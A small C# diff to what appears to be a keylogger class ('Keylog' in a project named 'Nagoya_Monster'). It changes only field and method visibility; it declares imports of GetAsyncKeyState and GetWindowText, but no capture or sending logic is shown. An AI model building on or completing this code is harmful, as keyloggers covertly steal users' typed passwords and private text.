@@ -8,8 +8,6 @@ namespace Nagoya_Monster
 {
     static class Keylog
     {
-        public static bool IsKeylogging = true;
-
         [DllImport("user32.dll")]
         private static extern int GetAsyncKeyState(int i);
 
@@ -20,6 +18,7 @@ namespace Nagoya_Monster
         private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
         private static bool IsRunning = false;
+        private static bool IsKeylogging = true;
         private static string LastWindowTitle = string.Empty;
         private static string CurrentWindowTitle = string.Empty;
 
@@ -35,7 +34,7 @@ namespace Nagoya_Monster
             IsRunning = false;
         }
 
-        public static void KeyLog()
+        private static void KeyLog()
         {
             if (!IsRunning)
             {
